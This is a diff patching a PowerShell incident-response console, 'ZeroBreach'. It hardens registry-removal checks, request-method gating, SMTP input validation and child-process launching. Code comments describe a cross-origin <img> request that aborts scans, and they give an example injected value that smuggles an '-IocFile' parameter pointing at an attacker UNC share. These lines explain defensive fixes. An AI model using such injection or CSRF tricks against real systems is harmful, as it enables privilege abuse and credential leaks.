@@ -1169,7 +1169,27 @@ function RLog { param([string]$Text, [string]$Sev = 'INFO') REnqueue @{ type='lo
 # common case, on the code path that handles a locked malware file.
 function RGet-RegVal {
     param([string]$Path, [string]$Name)
-    try { Get-ItemPropertyValue -Path $Path -Name $Name -ErrorAction Stop } catch { $null }
+    try { Get-ItemPropertyValue -LiteralPath $Path -Name $Name -ErrorAction Stop } catch { $null }
+}
+
+# Post-condition test for DeleteReg. Returns 'gone' | 'present' | 'unknown'.
+# A plain "did the read return null?" check is NOT safe here: RGet-RegVal returns $null on ANY
+# failure, so when the read fails for the same reason the write failed — malware sets a DENY ACE
+# for Administrators on its Run key, a standard persistence-hardening trick — the verification
+# passes and the operator is told the persistence value was removed while it is still armed.
+# That is the single worst lie this tool can tell, so an unreadable key is reported as unknown,
+# never as success.
+function Test-RRegValueGone {
+    param([string]$Path, [string]$Name)
+    try {
+        $k = Get-Item -LiteralPath $Path -ErrorAction Stop
+        if ($k.GetValueNames() -contains $Name) { return 'present' }
+        return 'gone'
+    } catch {
+        # Key itself is missing => the value cannot exist; anything else => we genuinely do not know.
+        if (-not (Test-Path -LiteralPath $Path)) { return 'gone' }
+        return 'unknown'
+    }
 }
 
 # SAFETY: hard backstop — mirror of Test-ProtectedTarget (main thread). The tool must NEVER
@@ -1271,15 +1291,15 @@ try {
                 'DeleteReg' {
                     $pts = "$($f.FixParam)" -split "\|", 2
                     if ($pts.Count -eq 2) {
-                        Remove-ItemProperty -Path $pts[0] -Name $pts[1] -Force -ErrorAction SilentlyContinue
-                        # Verify the post-condition like every sibling action does. Removal is
-                        # -EA SilentlyContinue, so an ACL-protected or in-use value fails silently;
-                        # reporting `applied` unconditionally told the operator a persistence value
-                        # was gone when it was still armed — the worst possible lie for this tool.
-                        if ($null -eq (RGet-RegVal $pts[0] $pts[1])) {
-                            RLog "  -> reg value removed: $($pts[1])" 'OK'; $ok = $true
-                        } else {
-                            RLog "  -> reg value REMOVE FAILED (still present): $($pts[1])" 'POSSIBLE'; $failed++
+                        # -LiteralPath, like every sibling action: a malware key or value name
+                        # containing [ ] * or ? is otherwise treated as a wildcard pattern, the
+                        # removal silently matches nothing, and the verification below would then
+                        # have to decide about a value it never touched.
+                        Remove-ItemProperty -LiteralPath $pts[0] -Name $pts[1] -Force -ErrorAction SilentlyContinue
+                        switch (Test-RRegValueGone $pts[0] $pts[1]) {
+                            'gone'    { RLog "  -> reg value removed: $($pts[1])" 'OK'; $ok = $true }
+                            'present' { RLog "  -> reg value REMOVE FAILED (still present): $($pts[1])" 'POSSIBLE'; $failed++ }
+                            default   { RLog "  -> reg value removal UNVERIFIABLE (key unreadable — likely an ACL denying Administrators, which is itself a finding): $($pts[1])" 'POSSIBLE'; $failed++ }
                         }
                     } else { RLog "  -> malformed reg target." 'POSSIBLE'; $failed++ }
                 }
@@ -1349,7 +1369,10 @@ try {
     RLog "[REMEDIATE] FATAL: $($_.Exception.Message)" 'CRITICAL'
 } finally {
     $RemState.Remediating = $false
-    REnqueue @{ type='remediation_complete'; applied=$applied; failed=$failed; skipped=$skipped; blocked=$blocked }
+    # snapshot: the rollback file's path. $RemState.SnapshotPath was written and never read, so
+    # the Report view's "rollback snapshot: …" line could never render and the one piece of
+    # information the operator needs after a bad PURGE only ever appeared in a transient log line.
+    REnqueue @{ type='remediation_complete'; applied=$applied; failed=$failed; skipped=$skipped; blocked=$blocked; snapshot="$($RemState.SnapshotPath)" }
     RLog "[REMEDIATE] Complete — applied:$applied  failed:$failed  skipped:$skipped  blocked(protected):$blocked" 'OK'
 }
 '@
@@ -1382,11 +1405,18 @@ function Handle-Request {
 
     # Hard gate on every state-changing request, ahead of the route table so a new POST
     # route can never be added without it.
-    if ($method -eq 'POST') {
+    # Gate EVERY non-safe method, not just POST. /api/scan/abort had no `$method -ne 'POST'`
+    # self-guard, so as a GET it skipped the gate entirely: a cross-origin
+    # <img src="http://localhost:PORT/api/scan/abort"> needs no preflight, no Origin check and
+    # no token, and aborting mid-scan makes the scan runspace fall into its finally block, write
+    # audit_<ts>.json and emit scan_complete — i.e. an attacker could silently truncate an
+    # incident-response scan and have the console report it as COMPLETE. Covering PUT/DELETE/
+    # PATCH too stops the same trick reaching the GET branches of /api/ioc and /api/profiles.
+    if ($method -notin @('GET','HEAD')) {
         $denyReason = Test-RequestAllowed $req
         if ($denyReason) {
             # Start-Transcript tees the console to server_console_*.log, so this is durable.
-            Write-Host "[ZeroBreach] BLOCKED POST $path — $denyReason" -ForegroundColor Yellow
+            Write-Host "[ZeroBreach] BLOCKED $method $path — $denyReason" -ForegroundColor Yellow
             Write-JsonResponse $Ctx (@{ error = 'forbidden'; detail = $denyReason } | ConvertTo-Json -Compress) 403
             return
         }
@@ -1679,11 +1709,26 @@ function Handle-Request {
             $smtpSrv = "$($sb.smtp_server)".Trim()
             $smtpFrm = "$($sb.smtp_from)".Trim()
             $smtpTo  = "$($sb.smtp_to)".Trim()
+            # VALIDATE before these reach a child process. They are interpolated into the
+            # engine's own $argBase (which builds the SYSTEM task's command line), so a value
+            # containing whitespace can smuggle extra engine parameters —
+            # "-SmtpTo x@y.z -IocFile \\attacker\share\evil.ioc" would make the elevated engine,
+            # and later the SYSTEM task, read IOC rules from an attacker UNC path (SMB NTLM leak
+            # of the machine account + attacker-controlled regex fed into -match). No whitespace,
+            # no quotes, bounded length; addresses must look like addresses.
+            $smtpHostRe = '^[A-Za-z0-9._\-]{1,255}$'
+            $smtpAddrRe = '^[A-Za-z0-9._%+\-]{1,64}@[A-Za-z0-9.\-]{1,190}\.[A-Za-z]{2,24}$'
+            if ($smtpSrv -and $smtpSrv -notmatch $smtpHostRe) { Write-JsonResponse $Ctx '{"error":"invalid smtp_server"}' 400; return }
+            if ($smtpFrm -and $smtpFrm -notmatch $smtpAddrRe) { Write-JsonResponse $Ctx '{"error":"invalid smtp_from"}' 400; return }
+            if ($smtpTo  -and $smtpTo  -notmatch $smtpAddrRe) { Write-JsonResponse $Ctx '{"error":"invalid smtp_to"}'  400; return }
             # Persist regardless, so the operator's SMTP details survive a reload.
+            # Write-Utf8Json serialises the object itself — passing it pre-converted JSON
+            # double-encoded the file, so GET returned a JSON *string* and the settings never
+            # repopulated in the UI.
             try {
                 Write-Utf8Json (Join-Path $script:REPORTS 'schedule_settings.json') ([ordered]@{
                     schedule = $sched; smtp_server = $smtpSrv; smtp_from = $smtpFrm; smtp_to = $smtpTo
-                } | ConvertTo-Json)
+                })
             } catch {}
 
             if (-not $sched) {
@@ -1693,17 +1738,38 @@ function Handle-Request {
                 catch { Write-JsonResponse $Ctx '{"status":"no schedule was registered"}' }
                 return
             }
-            # Values are passed as separate, individually quoted arguments — never concatenated
-            # into one interpolated command string — so an address cannot smuggle extra params.
+            # Start-Process -ArgumentList does NOT quote array elements — it joins them with a
+            # single space — so the engine path and -OutDir broke apart on any install directory
+            # containing a space (the portable zip is explicitly validated for spaced paths, and
+            # the route failed there with a bare "exit code -196608"). Quote each argument that
+            # can contain a space ourselves. The SMTP values are already whitespace-free by the
+            # validation above, so this is now correct on both counts.
+            $q = { param($v) '"' + ("$v" -replace '"','\"') + '"' }
             $schedArgs = @(
-                '-NoProfile','-ExecutionPolicy','Bypass','-File', $script:SCAN_PS,
-                '-Schedule', $sched, '-Auto', '-OutDir', $script:REPORTS
+                '-NoProfile','-ExecutionPolicy','Bypass',
+                '-File', (& $q $script:SCAN_PS),
+                '-Schedule', $sched, '-Auto',
+                '-OutDir', (& $q $script:REPORTS)
             )
             if ($smtpTo -and $smtpFrm -and $smtpSrv) {
                 $schedArgs += @('-SmtpTo', $smtpTo, '-SmtpFrom', $smtpFrm, '-SmtpServer', $smtpSrv)
             }
+            # ProcessStartInfo + WaitForExit(timeout) rather than Start-Process -Wait: the accept
+            # loop is strictly single-threaded, so an unbounded wait here freezes the ENTIRE
+            # console (SSE stream, scan progress, abort) until the child exits. Register-Scheduled
+            # Task on a domain-joined box can take a long time; cap it.
             try {
-                $sp = Start-Process -FilePath 'powershell.exe' -ArgumentList $schedArgs -Wait -PassThru -WindowStyle Hidden -ErrorAction Stop
+                $spi = [System.Diagnostics.ProcessStartInfo]::new()
+                $spi.FileName        = 'powershell.exe'
+                $spi.Arguments       = ($schedArgs -join ' ')
+                $spi.UseShellExecute = $false
+                $spi.CreateNoWindow  = $true
+                $sp = [System.Diagnostics.Process]::Start($spi)
+                if (-not $sp.WaitForExit(90000)) {
+                    try { $sp.Kill() } catch {}
+                    Write-JsonResponse $Ctx '{"error":"schedule registration timed out after 90s"}' 500
+                    return
+                }
                 if ($sp.ExitCode -eq 0) {
                     Write-JsonResponse $Ctx (@{ status = "scheduled task registered ($sched 02:00)" } | ConvertTo-Json -Compress)
                 } else {
@@ -1715,6 +1781,9 @@ function Handle-Request {
         }
 
         '^/api/scan/abort$' {
+            # Self-guard like every other mutating route, so this can never again be reached
+            # by a method that skips the gate above.
+            if ($method -ne 'POST') { Write-JsonResponse $Ctx '{"error":"POST required"}' 405; return }
             $script:State.Running = $false
             $p = $script:State.Process
             if ($p -and -not $p.HasExited) { try { $p.Kill() } catch {} }
